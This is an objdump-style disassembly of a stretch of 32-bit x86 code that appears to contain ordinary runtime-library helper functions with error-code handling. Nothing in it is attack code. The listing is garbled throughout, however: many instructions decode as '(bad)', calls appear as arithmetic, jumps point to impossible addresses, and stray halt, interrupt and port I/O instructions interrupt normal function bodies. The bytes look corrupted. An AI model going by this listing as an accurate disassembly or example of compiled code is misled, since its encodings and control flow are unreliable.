  40a21f:	eb 36                	jmp    0x40a257
  40a221:	83 3d dc a1 41 00 05 	cmpl   $0x5,0x41a1dc
  40a228:	7c 17                	jl     0x40a241
  40a22a:	8b 16                	mov    (%esi),%edx
  40a22c:	83 c2 0c             	add    $0xc,%edx
  40a22f:	52                   	push   %edx
  40a230:	55                   	push   %ebp
  40a231:	15 40 c0 40 00       	adc    $0x40c040,%eax
  40a236:	8b 89 c7 40 ca 00    	mov    0xca40c7(%ecx),%ecx
  40a23c:	00 b2 00 67 16 8b    	add    %dh,-0x74e99900(%edx)
  40a242:	0e                   	push   %cs
  40a243:	6a 00                	push   $0x0
  40a245:	6a 00                	push   $0x0
  40a247:	6a 00                	push   $0x0
  40a249:	89 41 04             	mov    %eax,0x4(%ecx)
  40a24c:	ff 15 44 fc 40 02    	call   *0x240fc44
  40a252:	87 16                	xchg   %edx,(%esi)
  40a254:	89 ae 08 af 70 68    	mov    %ebp,0x6870af08(%esi)
  40a25a:	20 57 40             	and    %dl,0x40(%edi)
  40a25d:	00 68 80             	add    %ch,-0x80(%eax)
  40a260:	a2 40 00 56 8b       	mov    %al,0x8b560040
  40a265:	f6 50 e8             	notb   -0x18(%eax)
  40a268:	94                   	xchg   %eax,%esp
  40a269:	33 ff                	xor    %edi,%edi
  40a26b:	ff 5f 33             	lcall  *0x33(%edi)
  40a26e:	c0 5e 5d c2          	rcrb   $0xc2,0x5d(%esi)
  40a272:	0c 00                	or     $0x0,%al
  40a274:	90                   	nop
  40a275:	90                   	nop
  40a276:	90                   	nop
  40a277:	90                   	nop
  40a278:	90                   	nop
  40a279:	90                   	nop
  40a27a:	90                   	nop
  40a27b:	90                   	nop
  40a27c:	90                   	nop
  40a27d:	c2 90 90             	ret    $0x9090
  40a280:	55                   	push   %ebp
  40a281:	86 ec                	xchg   %ch,%ah
  40a283:	8b 45 08             	mov    0x8(%ebp),%eax
  40a286:	8b 48 04             	mov    0x4(%eax),%ecx
  40a289:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40a28a:	c9                   	leave
  40a28b:	75 15                	jne    0x40a2a2
  40a28d:	23 40 04             	and    0x4(%eax),%eax
  40a290:	ff                   	(bad)
  40a291:	ff                   	(bad)
  40a292:	ff                   	(bad)
  40a293:	ff 83 c0 0c 50 ff    	incl   -0xaff340(%ebx)
  40a299:	15 3c c0 b4 ea       	adc    $0xeab4c03c,%eax
  40a29e:	de c0                	faddp  %st,%st(0)
  40a2a0:	5d                   	pop    %ebp
  40a2a1:	c3                   	ret
  40a2a2:	8b ef                	mov    %edi,%ebp
  40a2a4:	08 50 ff             	or     %dl,-0x1(%eax)
  40a2a7:	15 74 c0 40 00       	adc    $0x40c074,%eax
  40a2ac:	85 c0                	test   %eax,%eax
  40a2ae:	75 ee                	jne    0x40a29e
  40a2b0:	56                   	push   %esi
  40a2b1:	8b 35 98 a3 40 00    	mov    0x40a398,%esi
  40a2b7:	ff d6                	call   *%esi
  40a2b9:	85 8f 75 03 5e 5d    	test   %ecx,0x5d5e0375(%edi)
  40a2bf:	86 ff                	xchg   %bh,%bh
  40a2c1:	d6                   	salc
  40a2c2:	05 80 fc 0a 00       	add    $0xafc80,%eax
  40a2c7:	5e                   	pop    %esi
  40a2c8:	5d                   	pop    %ebp
  40a2c9:	c3                   	ret
  40a2ca:	db 90 90 90 90 90    	fistl  -0x6f6f6f70(%eax)
  40a2d0:	55                   	push   %ebp
  40a2d1:	8b 81 8b 45 08 8b    	mov    -0x74f7ba75(%ecx),%eax
  40a2d7:	48                   	dec    %eax
  40a2d8:	04 85                	add    $0x85,%al
  40a2da:	c9                   	leave
  40a2db:	75 b4                	jne    0x40a291
  40a2dd:	83 c0 0c             	add    $0xc,%eax
  40a2e0:	50                   	push   %eax
  40a2e1:	ff 15 38 db 40 00    	call   *0x40db38
  40a2e7:	33 c0                	xor    %eax,%eax
  40a2e9:	5d                   	pop    %ebp
  40a2ea:	c2 04 00             	ret    $0x4
  40a2ed:	8b 40 ee             	mov    -0x12(%eax),%eax
  40a2f0:	c0 ff 50             	sar    $0x50,%bh
  40a2f3:	ff 15 a2 c0 40 00    	call   *0x40c0a2
  40a2f9:	85 d1                	test   %edx,%ecx
  40a2fb:	74 fe                	je     0x40a2fb
  40a2fd:	b7 80                	mov    $0x80,%bh
  40a2ff:	00 00                	add    %al,(%eax)
  40a301:	00 77 e3             	add    %dh,-0x1d(%edi)
  40a304:	aa                   	stos   %al,%es:(%edi)
  40a305:	02 01                	add    (%ecx),%al
  40a307:	00 00                	add    %al,(%eax)
  40a309:	56                   	push   %esi
  40a30a:	75 fe                	jne    0x40a30a
  40a30c:	b8 89 11 d6 00       	mov    $0xd61189,%eax
  40a311:	7b 5d                	jnp    0x40a370
  40a313:	c2 dc 00             	ret    $0xdc
  40a316:	8b 35 98 df a1 00    	mov    0xa1df98,%esi
  40a31c:	b3 88                	mov    $0x88,%bl
  40a31e:	85 c0                	test   %eax,%eax
  40a320:	75 05                	jne    0x40a327
  40a322:	5e                   	pop    %esi
  40a323:	5d                   	pop    %ebp
  40a324:	e9 04 00 ff d6       	jmp    0xd73fa32d
  40a329:	a0 80 fc 0a 00       	mov    0xafc80,%al
  40a32e:	5e                   	pop    %esi
  40a32f:	5d                   	pop    %ebp
  40a330:	c2 04 2e             	ret    $0x2e04
  40a333:	90                   	nop
  40a334:	90                   	nop
  40a335:	90                   	nop
  40a336:	90                   	nop
  40a337:	90                   	nop
  40a338:	90                   	nop
  40a339:	90                   	nop
  40a33a:	90                   	nop
  40a33b:	d2 56 69             	rclb   %cl,0x69(%esi)
  40a33e:	f0 17                	lock pop %ss
  40a340:	d3 8b ec 8b 4d 08    	rorl   %cl,0x84d8bec(%ebx)
  40a346:	0e                   	push   %cs
  40a347:	8b 41 04             	mov    0x4(%ecx),%eax
  40a34a:	85 c0                	test   %eax,%eax
  40a34c:	75 11                	jne    0x40a35f
  40a34e:	83 c1 0c             	add    $0xc,%ecx
  40a351:	51                   	push   %ecx
  40a352:	0a 15 2c c0 c3 4a    	or     0x4ac3c02c,%dl
  40a358:	33 c0                	xor    %eax,%eax
  40a35a:	5e                   	pop    %esi
  40a35b:	56                   	push   %esi
  40a35c:	49                   	dec    %ecx
  40a35d:	04 94                	add    $0x94,%al
  40a35f:	83 f8 01             	cmp    $0x1,%eax
  40a362:	75 a1                	jne    0x40a305
  40a364:	8b f6                	mov    %esi,%esi
  40a366:	c2 50 ff             	ret    $0xff50
  40a369:	15 30 c0 40 00       	adc    $0x40c030,%eax
  40a36e:	eb fe                	jmp    0x40a36e
  40a370:	47                   	inc    %edi
  40a371:	f8                   	clc
  40a372:	02 75 e3             	add    -0x1d(%ebp),%dh
  40a375:	8b 49 08             	mov    0x8(%ecx),%ecx
  40a378:	51                   	push   %ecx
  40a379:	ff 15 34 4e 40 00    	call   *0x404e34
  40a37f:	85 c0                	test   %eax,%eax
  40a381:	75 11                	jne    0x40a394
  40a383:	8b 35 98 d6 40 00    	mov    0x40d698,%esi
  40a389:	ff d6                	call   *%esi
  40a38b:	85 c0                	test   %eax,%eax
  40a38d:	74 0f                	je     0x40a39e
  40a38f:	ff d6                	call   *%esi
  40a391:	05 d5 fc 0a 00       	add    $0xafcd5,%eax
  40a396:	5e                   	pop    %esi
  40a397:	5d                   	pop    %ebp
  40a398:	86 10                	xchg   %dl,(%eax)
  40a39a:	00 90 90 90 90 90    	add    %dl,-0x6f6f6f70(%eax)
  40a3a0:	55                   	push   %ebp
  40a3a1:	8b ec                	mov    %esp,%ebp
  40a3a3:	8b 45 08             	mov    0x8(%ebp),%eax
  40a3a6:	68 80 a8 40 00       	push   $0x40a880
  40a3ab:	50                   	push   %eax
  40a3ac:	8b 00                	mov    (%eax),%eax
  40a3ae:	50                   	push   %eax
  40a3af:	e8 0c b3 ff ff       	call   0x4056c0
  40a3b4:	5d                   	pop    %ebp
  40a3b5:	c2 04 00             	ret    $0x4
  40a3b8:	a9 90 90 00 90       	test   $0x90009090,%eax
  40a3bd:	90                   	nop
  40a3be:	90                   	nop
  40a3bf:	90                   	nop
  40a3c0:	fe c0                	inc    %al
  40a3c2:	c2 04 08             	ret    $0x804
  40a3c5:	90                   	nop
  40a3c6:	f0 90                	lock nop
  40a3c8:	90                   	nop
  40a3c9:	90                   	nop
  40a3ca:	90                   	nop
  40a3cb:	90                   	nop
  40a3cc:	90                   	nop
  40a3cd:	90                   	nop
  40a3ce:	90                   	nop
  40a3cf:	90                   	nop
  40a3d0:	22 8b ec 8b 45 ea    	and    -0x15ba7414(%ebx),%cl
  40a3d6:	8b 40 14             	mov    0x14(%eax),%eax
  40a3d9:	85 c0                	test   %eax,%eax
  40a3db:	74 33                	je     0x40a410
  40a3dd:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40a3de:	4d                   	dec    %ebp
  40a3df:	0c 51                	or     $0x51,%al
  40a3e1:	50                   	push   %eax
  40a3e2:	ff 15 28 0e 40 00    	call   *0x400e28
  40a3e8:	85 c0                	test   %eax,%eax
  40a3ea:	75 1e                	jne    0x40a40a
  40a3ec:	56                   	push   %esi
  40a3ed:	8b 35 98 5f 40 00    	mov    0x405f98,%esi
  40a3f3:	ff d6                	call   *%esi
  40a3f5:	85 c0                	test   %eax,%eax
  40a3f7:	75 05                	jne    0x40a3fe
  40a3f9:	5e                   	pop    %esi
  40a3fa:	54                   	push   %esp
  40a3fb:	c2 08 f4             	ret    $0xf408
  40a3fe:	ff d6                	call   *%esi
  40a400:	05 80 fc 0a 00       	add    $0xafc80,%eax
  40a405:	da bf c2 08 00 33    	fidivrl 0x330008c2(%edi)
  40a40b:	c0 5d c2 08          	rcrb   $0x8,-0x3e(%ebp)
  40a40f:	00 92 3b 4e ba 00    	add    %dl,0xba4e3b(%edx)
  40a415:	9c                   	pushf
  40a416:	c2 08 00             	ret    $0x8
  40a419:	90                   	nop
  40a41a:	03 90 90 90 0a 90    	add    -0x6ff56f70(%eax),%edx
  40a420:	6e                   	outsb  %ds:(%esi),(%dx)
  40a421:	34 90                	xor    $0x90,%al
  40a423:	90                   	nop
  40a424:	90                   	nop
  40a425:	26 90                	es nop
  40a427:	90                   	nop
  40a428:	90                   	nop
  40a429:	90                   	nop
  40a42a:	17                   	pop    %ss
  40a42b:	90                   	nop
  40a42c:	90                   	nop
  40a42d:	90                   	nop
  40a42e:	90                   	nop
  40a42f:	90                   	nop
  40a430:	55                   	push   %ebp
  40a431:	8b 67 83             	mov    -0x7d(%edi),%esp
  40a434:	3d dc 08 18 00       	cmp    $0x1808dc,%eax
  40a439:	14 90                	adc    $0x90,%al
  40a43b:	23 20                	and    (%eax),%esp
  40a43d:	28 07                	sub    %al,(%edi)
  40a43f:	41                   	inc    %ecx
  40a440:	00 ff                	add    %bh,%bh
  40a442:	15 40 c0 40 00       	adc    $0x40c040,%eax
  40a447:	30 45 08             	xor    %al,0x8(%ebp)
  40a44a:	68 20 57 40 31       	push   $0x31405720
  40a44f:	68 70 a4 40 00       	push   $0x40a470
  40a454:	68 28 07 41 00       	push   $0x410728
  40a459:	fd                   	std
  40a45a:	e8 a1 5e ff 11       	call   0x12400300
  40a45f:	33 c0                	xor    %eax,%eax
  40a461:	5d                   	pop    %ebp
  40a462:	c3                   	ret
  40a463:	f2 90                	repnz nop
  40a465:	90                   	nop
  40a466:	90                   	nop
  40a467:	de 90 90 90 90 90    	ficoms -0x6f6f6f70(%eax)
  40a46d:	90                   	nop
  40a46e:	90                   	nop
  40a46f:	93                   	xchg   %eax,%ebx
  40a470:	68 28 07 41 00       	push   $0x410728
  40a475:	ff 15 3c c0 40 00    	call   *0x40c03c
  40a47b:	33 c0                	xor    %eax,%eax
  40a47d:	90                   	nop
  40a47e:	6c                   	insb   (%dx),%es:(%edi)
  40a47f:	f8                   	clc
  40a480:	55                   	push   %ebp
  40a481:	8b ec                	mov    %esp,%ebp
  40a483:	8b 45 a6             	mov    -0x5a(%ebp),%eax
  40a486:	8b c8                	mov    %eax,%ecx
  40a488:	81 e1 00 00 00 c0    	and    $0xc0000000,%ecx
  40a48e:	81 44 00 75 00 c0 75 	addl   $0x9475c000,0x75(%eax,%eax,1)
  40a495:	94 
  40a496:	a9 00 00 ff 3f       	test   $0x3fff0000,%eax
  40a49b:	b8 02 54 00 00       	mov    $0x5402,%eax
  40a4a0:	74 05                	je     0x40a4a7
  40a4a2:	b8 01 00 00 00       	mov    $0x1,%eax
  40a4a7:	cd c3                	int    $0xc3
  40a4a9:	90                   	nop
  40a4aa:	90                   	nop
  40a4ab:	90                   	nop
  40a4ac:	90                   	nop
  40a4ad:	90                   	nop
  40a4ae:	90                   	nop
  40a4af:	6c                   	insb   (%dx),%es:(%edi)
  40a4b0:	55                   	push   %ebp
  40a4b1:	8b ec                	mov    %esp,%ebp
  40a4b3:	8b b0 ed 56 8b 5c    	mov    0x5c8b56ed(%eax),%esi
  40a4b9:	08 f7                	or     %dh,%bh
  40a4bb:	d8 d8                	fcomp  %st(0)
  40a4bd:	c0 f7 d8             	shl    $0xd8,%bh
  40a4c0:	48                   	dec    %eax
  40a4c1:	50                   	push   %eax
  40a4c2:	8b 46 42             	mov    0x42(%esi),%eax
  40a4c5:	50                   	push   %eax
  40a4c6:	ff 15 9c c0 40 00    	call   *0x40c09c
  40a4cc:	dd 78 89             	fnstsw -0x77(%eax)
  40a4cf:	45                   	inc    %ebp
  40a4d0:	14 75                	adc    $0x75,%al
  40a4d2:	4b                   	dec    %ebx
  40a4d3:	8b 56 14             	mov    0x14(%esi),%edx
  40a4d6:	8d 4d 14             	lea    0x14(%ebp),%ecx
  40a4d9:	8e e1                	mov    %ecx,%fs
  40a4db:	ff 15 24 dd 40 00    	call   *0x40dd24
  40a4e1:	8b c0                	mov    %eax,%eax
  40a4e3:	74 4a                	je     0x40a52f
  40a4e5:	8b 45 0c             	mov    0xc(%ebp),%eax
  40a4e8:	8b 2a                	mov    (%edx),%ebp
  40a4ea:	14 85                	adc    $0x85,%al
  40a4ec:	ff 74 02 89          	push   -0x77(%edx,%eax,1)
  40a4f0:	08 85 55 10 85 d2    	or     %al,-0x2d7aefab(%ebp)
  40a4f6:	81 0b a1 e8 82 ff    	orl    $0xff82e8a1,(%ebx)
  40a4fc:	ff                   	(bad)
  40a4fd:	ff 83 c4 04 89 02    	incl   0x28904c4(%ebx)
  40a503:	8b 46 b9             	mov    -0x47(%esi),%eax
  40a506:	50                   	push   %eax
  40a507:	39 15 8e c0 40 9d    	cmp    %edx,0x9d40c08e
  40a50d:	c7 46 14 00 a2 00 00 	movl   $0xa200,0x14(%esi)
  40a514:	2b 75 11             	sub    0x11(%ebp),%esi
  40a517:	01 00                	add    %eax,(%eax)
  40a519:	5e                   	pop    %esi
  40a51a:	5d                   	pop    %ebp
  40a51b:	c2 10 34             	ret    $0x3410
  40a51e:	3d 02 01 00 00       	cmp    $0x102,%eax
  40a523:	75 0a                	jne    0x40a52f
  40a525:	b8 76 11 01 00       	mov    $0x11176,%eax
  40a52a:	5e                   	pop    %esi
  40a52b:	3d c2 10 00 8b       	cmp    $0x8b0010c2,%eax
  40a530:	35 98 c0 40 00       	xor    $0x40c098,%eax
  40a535:	ff d6                	call   *%esi
  40a537:	85 c0                	test   %eax,%eax
  40a539:	75 05                	jne    0x40a540
  40a53b:	5e                   	pop    %esi
  40a53c:	be c2 10 00 ff       	mov    $0xff0010c2,%esi
  40a541:	d6                   	salc
  40a542:	05 80 fc bc 00       	add    $0xbcfc80,%eax
  40a547:	5e                   	pop    %esi
  40a548:	5d                   	pop    %ebp
  40a549:	aa                   	stos   %al,%es:(%edi)
  40a54a:	10 00                	adc    %al,(%eax)
  40a54c:	90                   	nop
  40a54d:	90                   	nop
  40a54e:	05 90 55 27 ec       	add    $0xec275590,%eax
  40a553:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40a556:	e2 45                	loop   0x40a59d
  40a558:	08 85 c9 56 74 49    	or     %al,0x497456c9(%ebp)
  40a55e:	8d 74 08 04          	lea    0x4(%eax,%ecx,1),%esi
  40a562:	3b c6                	cmp    %esi,%eax
  40a564:	73 11                	jae    0x40a577
  40a566:	79 11                	jns    0x40a579
  40a568:	0c 8a                	or     $0x8a,%al
  40a56a:	0a 84 c9 88 08 74 09 	or     0x9740888(%ecx,%ecx,8),%al
  40a571:	40                   	inc    %eax
  40a572:	98                   	cwtl
  40a573:	3b fe                	cmp    %esi,%edi
  40a575:	72 fb                	jb     0x40a572
  40a577:	dc 00                	faddl  (%eax)
  40a579:	00 5e 5d             	add    %bl,0x5d(%esi)
  40a57c:	c2 0c 00             	ret    $0xc
  40a57f:	90                   	nop
  40a580:	55                   	push   %ebp
  40a581:	8b ec                	mov    %esp,%ebp
  40a583:	53                   	push   %ebx
  40a584:	8b dd                	mov    %ebp,%ebx
  40a586:	45                   	inc    %ebp
  40a587:	3e 40                	ds inc %eax
  40a589:	00 56 57             	add    %dl,0x57(%esi)
  40a58c:	8b 49 08             	mov    0x8(%ecx),%ecx
  40a58f:	6a 2f                	push   $0x2f
  40a591:	57                   	push   %edi
  40a592:	ff d3                	call   *%ebx
  40a594:	6a 5c                	push   $0x5c
  40a596:	57                   	push   %edi
  40a597:	8b f0                	mov    %eax,%esi
  40a599:	ff d3                	call   *%ebx
  40a59b:	83 b7 10 3b c6 76 02 	xorl   $0x2,0x76c63b10(%edi)
  40a5a2:	8b 9c 85 f6 75 74 6a 	mov    0x6a7475f6(%ebp,%eax,4),%ebx
  40a5a9:	b2 57                	mov    $0x57,%dl
  40a5ab:	ff d3                	call   *%ebx
  40a5ad:	8b 39                	mov    (%ecx),%edi
  40a5af:	83 c4 08             	add    $0x8,%esp
  40a5b2:	85 f6                	test   %esi,%esi
  40a5b4:	74 0a                	je     0x40a5c0
  40a5b6:	8d 46 01             	lea    0x1(%esi),%eax
  40a5b9:	5f                   	pop    %edi
  40a5ba:	5e                   	pop    %esi
  40a5bb:	e9 5d c2 04 34       	jmp    0x3445681d
  40a5c0:	b8 c7 5f 5e 5b       	mov    $0x5b5e5fc7,%eax
  40a5c5:	5d                   	pop    %ebp
  40a5c6:	c2 04 00             	ret    $0x4
  40a5c9:	90                   	nop
  40a5ca:	90                   	nop
  40a5cb:	90                   	nop
  40a5cc:	30 90 90 90 55 8b    	xor    %dl,-0x74aa6f70(%eax)
  40a5d2:	ec                   	in     (%dx),%al
  40a5d3:	83 ec 18             	sub    $0x18,%esp
  40a5d6:	53                   	push   %ebx
  40a5d7:	8b 5d 10             	mov    0x10(%ebp),%ebx
  40a5da:	12 db                	adc    %bl,%bl
  40a5dc:	57                   	push   %edi
  40a5dd:	c7 45 24 00 00 00 bf 	movl   $0xbf000000,0x24(%ebp)
  40a5e4:	7d 13                	jge    0x40a5f9
  40a5e6:	09 45 0c             	or     %eax,0xc(%ebp)
  40a5e9:	33 db                	xor    %ebx,%ebx
  40a5eb:	a2 38 00 74 b0       	mov    %al,0xb0740038
  40a5f0:	8b 4c ed 04          	mov    0x4(%ebp,%ebp,8),%ecx
  40a5f4:	43                   	inc    %ebx
  40a5f5:	85 c9                	test   %ecx,%ecx
  40a5f7:	75 f7                	jne    0x40a5f0
  40a5f9:	8d 04 9d 04 5b fa 00 	lea    0xfa5b04(,%ebx,4),%eax
  40a600:	56                   	push   %esi
  40a601:	50                   	push   %eax
  40a602:	ff                   	lcall  (bad)
  40a603:	d9 5c c1 40          	fstps  0x40(%ecx,%eax,8)
  40a607:	00 a4 c4 04 8b 8f 85 	add    %ah,-0x7a7074fc(%esp,%eax,8)
  40a60e:	db 89 7d 4d 7e 36    	fisttpl 0x367e4d7d(%ecx)
  40a614:	48                   	dec    %eax
  40a615:	45                   	inc    %ebp
  40a616:	0c 8b                	or     $0x8b,%al
  40a618:	f7 34 e4             	divl   (%esp,%eiz,8)
  40a61b:	89 92 f8 04 45 10    	mov    %edx,0x104504f8(%edx)
  40a621:	eb 92                	jmp    0x40a5b5
  40a623:	48                   	dec    %eax
  40a624:	45                   	inc    %ebp
  40a625:	10 8b 0c 30 24 ff    	adc    %cl,-0xdbcff4(%ebx)
  40a62b:	c7                   	(bad)
  40a62c:	0c 77                	or     $0x77,%al
  40a62e:	f9                   	stc
  40a62f:	00 83 c4 04 29 89    	add    %al,-0x76d6fb3c(%ebx)
  40a635:	06                   	push   %es
  40a636:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40a639:	03 d0                	add    %eax,%edx
  40a63b:	6c                   	insb   (%dx),%es:(%edi)
  40a63c:	e8 f8 83 c6 04       	call   0x5072a39
  40a641:	48                   	dec    %eax
  40a642:	89 55 fc             	mov    %edx,-0x4(%ebp)
  40a645:	d2 45 55             	rolb   %cl,0x55(%ebp)
  40a648:	75 d9                	jne    0x40a623
  40a64a:	8b 45 c5             	mov    -0x3b(%ebp),%eax
  40a64d:	22 44 a7 f9          	and    -0x7(%edi,%eiz,4),%al
  40a651:	50                   	push   %eax
  40a652:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40a655:	ff 15 5c 3a 40 e3    	call   *0xe3403a5c
  40a65b:	78 1b                	js     0x40a678
  40a65d:	04 33                	add    $0x33,%al
  40a65f:	c9                   	leave
  40a660:	85 db                	test   %ebx,%ebx
  40a662:	49                   	dec    %ecx
  40a663:	45                   	inc    %ebp
  40a664:	f8                   	clc
  40a665:	8b 69 7e             	mov    0x7e(%ecx),%ebp
  40a668:	54                   	push   %esp
  40a669:	8b 45 0c             	mov    0xc(%ebp),%eax
  40a66c:	8b 01                	mov    (%ecx),%eax
  40a66e:	f4                   	hlt
  40a66f:	2b c1                	sub    %ecx,%eax
  40a671:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40a674:	89 45 a0             	mov    %eax,-0x60(%ebp)
  40a677:	89 5d 0c             	mov    %ebx,0xc(%ebp)
  40a67a:	89 5d e8             	mov    %ebx,-0x18(%ebp)
  40a67d:	7a 03                	jp     0x40a682
  40a67f:	8b 45 10             	mov    0x10(%ebp),%eax
  40a682:	8b dd                	mov    %ebp,%ebx
  40a684:	89 ff                	mov    %edi,%edi
  40a686:	ec                   	in     (%dx),%al
  40a687:	26 4d                	es dec %ebp
  40a689:	fc                   	cld
  40a68a:	89 55 f0             	mov    %edx,-0x10(%ebp)
  40a68d:	89 37                	mov    %esi,(%edi)
  40a68f:	d9 04 07             	flds   (%edi,%eax,1)
  40a692:	6b 8d 55 f0 56 52 ab 	imul   $0xffffffab,0x5256f055(%ebp),%ecx
  40a699:	e8 52 05 00 00       	call   0x40abf0
  40a69e:	8b 4d f1             	mov    -0xf(%ebp),%ecx
  40a6a1:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40a6a4:	2b 08                	sub    (%eax),%ecx
  40a6a6:	ef                   	out    %eax,(%dx)
  40a6a7:	c7                   	(bad)
  40a6a8:	bb 03 f0 8b 60       	mov    $0x608bf003,%ebx
  40a6ad:	0c 48                	or     $0x48,%al
  40a6af:	89 45 5d             	mov    %eax,0x5d(%ebp)
  40a6b2:	75 35                	jne    0x40a6e9
  40a6b4:	1f                   	pop    %ds
  40a6b5:	7d f4                	jge    0x40a6ab
  40a6b7:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  40a6ba:	8b 63 f8             	mov    -0x8(%ebx),%esp
  40a6bd:	73 04                	jae    0x40a6c3
  40a6bf:	30 e2                	xor    %ah,%dl
  40a6c1:	0a 00                	or     (%eax),%al
  40a6c3:	00 c6                	add    %al,%dh
  40a6c5:	06                   	push   %es
  40a6c6:	00 2b                	add    %ch,(%ebx)
  40a6c8:	f0 46                	lock inc %esi
  40a6ca:	56                   	push   %esi
  40a6cb:	20 ff                	and    %bh,%bh
  40a6cd:	15 20 58 52 00       	adc    $0x525820,%eax
  40a6d2:	8b 4d 4a             	mov    0x4a(%ebp),%ecx
  40a6d5:	83 89 46 3b d5 5e 28 	orl    $0x28,0x5ed53b46(%ecx)
  40a6dc:	5b                   	pop    %ebx
  40a6dd:	2b c1                	sub    %ecx,%eax
  40a6df:	8b 56 85             	mov    -0x7b(%esi),%edx
  40a6e2:	c0 85 db 7e 1a 8b 14 	rolb   $0x14,-0x74e58125(%ebp)
  40a6e9:	87 03                	xchg   %eax,(%ebx)
  40a6eb:	0a 89 14 d0 40 3b    	or     0x3b40d014(%ecx),%cl
  40a6f1:	9e                   	sahf
  40a6f2:	7c 8c                	jl     0x40a680
  40a6f4:	8b 4d 89             	mov    -0x77(%ebp),%ecx
  40a6f7:	8b c3                	mov    %ebx,%eax
  40a6f9:	89 34 5f             	mov    %esi,(%edi,%ebx,2)
  40a6fc:	5b                   	pop    %ebx
  40a6fd:	8b e5                	mov    %ebp,%esp
  40a6ff:	5d                   	pop    %ebp
  40a700:	c3                   	ret
  40a701:	8b 55 08             	mov    0x8(%ebp),%edx
  40a704:	8b c3                	mov    %ebx,%eax
  40a706:	27                   	daa
  40a707:	3a 5f 5b             	cmp    0x5b(%edi),%bl
  40a70a:	8b e5                	mov    %ebp,%esp
  40a70c:	c8 c3 8b 45          	enter  $0x8bc3,$0x45
  40a710:	08 89 38 8b c3 5f    	or     %cl,0x5fc38b38(%ecx)
  40a716:	5b                   	pop    %ebx
  40a717:	0e                   	push   %cs
  40a718:	e5 08                	in     $0x8,%eax
  40a71a:	c3                   	ret
  40a71b:	90                   	nop
  40a71c:	90                   	nop
  40a71d:	90                   	nop
  40a71e:	90                   	nop
  40a71f:	90                   	nop
  40a720:	55                   	push   %ebp
  40a721:	8b ec                	mov    %esp,%ebp
  40a723:	1b dc                	sbb    %esp,%ebx
  40a725:	08 41 72             	or     %al,0x72(%ecx)
  40a728:	56                   	push   %esi
  40a729:	85 c0                	test   %eax,%eax
  40a72b:	57                   	push   %edi
  40a72c:	18 85 e9 01 00 0c    	sbb    %al,0xc0001e9(%ebp)
  40a732:	68 f8 07 41 00       	push   $0x4107f8
  40a737:	c7 05 f8 07 49 00 a7 	movl   $0x4c00a7,0x4907f8
  40a73e:	00 4c 00 
  40a741:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40a742:	15 20 d4 40 00       	adc    $0x40d420,%eax
  40a747:	a1 08 08 41 00       	mov    0x410808,%eax
  40a74c:	83 f1 02             	xor    $0x2,%ecx
  40a74f:	8f 85 38 01 00 00    	pop    0x138(%ebp)
  40a755:	a0 0c 08 41 00       	mov    0x41080c,%al
  40a75a:	be 0c 08 68 00       	mov    $0x68080c,%esi
  40a75f:	84 c0                	test   %al,%al
  40a761:	74 3b                	je     0x40a79e
  40a763:	8b 3d ba c1 31 00    	mov    0x31c1ba,%edi
  40a769:	a1 74 c1 40 00       	mov    0x40c174,%eax
  40a76e:	61                   	popa
  40a76f:	06                   	push   %es
  40a770:	01 7e 0e             	add    %edi,0xe(%esi)
  40a773:	33 39                	xor    (%ecx),%edi
  40a775:	6a 04                	push   $0x4
  40a777:	8a 80 51 ff d7 af    	mov    -0x502800af(%eax),%al
  40a77d:	57                   	push   %edi
  40a77e:	08 eb                	or     %ch,%bl
  40a780:	11 a1 78 c1 40 00    	adc    %esp,0x40c178(%ecx)
  40a786:	24 d2                	and    $0xd2,%al
  40a788:	85 16                	test   %edx,(%esi)
  40a78a:	8b 08                	mov    (%eax),%ecx
  40a78c:	8a 04 51             	mov    (%ecx,%edx,2),%al
  40a78f:	83 e0 04             	and    $0x4,%eax
  40a792:	85 c0                	test   %eax,%eax
  40a794:	75 b2                	jne    0x40a748
  40a796:	8a 0c 01             	mov    (%ecx,%eax,1),%cl
  40a799:	46                   	inc    %esi
  40a79a:	84 c0                	test   %al,%al
  40a79c:	a9 cb e9 96 41       	test   $0x4196e9cb,%eax
  40a7a1:	d2 41 00             	rolb   %cl,0x0(%ecx)
  40a7a4:	fd                   	std
  40a7a5:	fc                   	cld
  40a7a6:	83 41 65 83          	addl   $0xffffff83,0x65(%ecx)
  40a7aa:	f8                   	clc
  40a7ab:	03 81 82 30 01 00    	add    0x13082(%ecx),%eax
  40a7b1:	00 a5 84 59 01 00    	add    %ah,0x15984(%ebp)
  40a7b7:	00 83 1c 04 75 65    	add    %al,0x6575041c(%ebx)
  40a7bd:	83 a2 c3 73 23 b8 28 	andl   $0x28,-0x47dc8c3d(%edx)
  40a7c4:	00 00                	add    %al,(%eax)
  40a7c6:	00 e9                	add    %ch,%cl
  40a7c8:	4a                   	dec    %edx
  40a7c9:	01 00                	add    %eax,(%eax)
  40a7cb:	00 80 3e f3 dc cd    	add    %al,-0x32230cc2(%eax)
  40a7d1:	cd 2d                	int    $0x2d
  40a7d3:	15 6c c1 40 00       	adc    $0x40c16c,%eax
  40a7d8:	8b c8                	mov    %eax,%ecx
  40a7da:	83 c4 04             	add    $0x4,%esp
  40a7dd:	bd 0d e0 08 41       	mov    $0x4108e00d,%ebp
  40a7e2:	00 c2                	add    %al,%dl
  40a7e4:	bf 77 0a b8 2a       	mov    $0x2ab80a77,%edi
  40a7e9:	00 00                	add    %al,(%eax)
  40a7eb:	0f 55 25 01 00 36 d5 	andnps 0xd5360001,%xmm4
  40a7f2:	c8 03 fe 0a          	enter  $0xfe03,$0xa
  40a7f6:	b8 2b 00 d7 a0       	mov    $0xa0d7002b,%eax
  40a7fb:	e9 16 01 1d 00       	jmp    0x5da916
  40a800:	ef                   	out    %eax,(%dx)
  40a801:	f9                   	stc
  40a802:	04 77                	add    $0x77,%al
  40a804:	0a 3e                	or     (%esi),%bh
  40a806:	2c 00                	sub    $0x0,%al
  40a808:	00 00                	add    %al,(%eax)
  40a80a:	e9 48 01 00 cf       	jmp    0xcf40a957
  40a80f:	ba 85 9d 00 00       	mov    $0x9d85,%edx
  40a814:	3b d1                	cmp    %ecx,%edx
  40a816:	1b 4e f7             	sbb    -0x9(%esi),%ecx
  40a819:	d8 83 c0 2d e9 f4    	fadds  -0xb16d240(%ebx)
